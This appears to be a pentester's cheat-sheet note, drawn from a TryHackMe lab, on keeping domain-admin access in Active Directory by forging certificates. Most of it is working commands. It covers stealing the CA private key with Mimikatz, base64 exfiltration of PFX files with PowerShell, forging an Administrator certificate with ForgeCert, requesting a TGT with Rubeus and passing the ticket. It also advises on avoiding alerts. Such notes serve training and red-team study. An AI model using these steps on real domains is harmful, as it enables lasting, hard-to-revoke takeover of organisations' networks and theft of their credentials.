# Active Directory Persistence With Certificates

We can use [[AD-Certificate-Exploitation]], leveraging certifications to become Domain Administrators, as a viable method of persistence. All that is required is:
- A valid certificate used for client authentication
- The certificate can be used to request a TGT.
- The certificate has to be revoked or expire for a failure state to occur, therefore potential persistent access by default is approximately around 5 years depending on certificate rotation. 

## Certificate Authority CA 

Steal the private key of the root CA's certificate to generate our own certificates. Blue can not revoke them as they were never issued by the CA and would require a CA rotation - all issued certificates would have to be revoked and new one reinstated! 

The private key of the CA is stored on the CA server, if not protected through Hardware Security Module (HSM) - a hardware-based protection method - it is protected by the machine Data Protection API (DPAPI).

With [[Mimikatz-Cheatsheet]] or [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI):

Way to exfiltrate the certificates with PowerShell
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("/users/administrator/LOCAL_MACHINE_Remote Desktop_0_INTERN-PC.pfx"))
```
Way to infiltrate a certificate with PowerShell
```powershell
$base64String = "<INSERT Base64 ENCODED PFX>"
# Convert the Base64 string back to bytes
$bytes = [System.Convert]::FromBase64String($base64String)

# Save the bytes to a file
Set-Content -Path "<YOUR PATH>\file.pfx" -Value $bytes -Encoding Byte
```

With Mimikatz - [[Mimikatz-Cheatsheet]]
```powershell
# View CA Certificate on the DC 
# Some Certificates do not allow exporting the private key  
crypto::certificates /systemstore:local_machine
# Therefore use Mimikatz to generate a new certificate 
privilege::debug
crypto::capi
crypto:cng
crypto::certificates /systemstore:local_machine /export
# Exported certificates will be stored in both PFX and DER format to disk
```
Transfer both .pfx and .der certificate files to non domain machine for safe keeping and safer certificate generation.

Use SpectreOps's [ForgeCert](https://github.com/GhostPack/ForgeCert) to forge a Client Authentication certificate.
```powershell
# --SubjectAltName is User principle name UPN 
ForgeCert.exe --CaCertPath $exportedCAcertificate --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath $NewCertName.pfx --NewCertPassword Password123
```
Then use [[Rubeus-Cheatsheet]] to request a TGT using the certificate to verify that the certificate is trusted:
```powershell
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:$generated-cert /password:$cert-password /outfile:$output.pfx /domain:$domain /dc:$dc-ip
# /user has to match the UPN for the certificate
# set /enctype to avoid overpass-the-hash alert
# /dc: set to DC that has CA service running!
```

Then [[Mimikatz-Cheatsheet]] to [[Pass-The-Ticket]]
```powershell
kerberos::ptt $ticket.kirbi
```

## References

[THM AD Persistence Room](https://tryhackme.com/room/persistingad)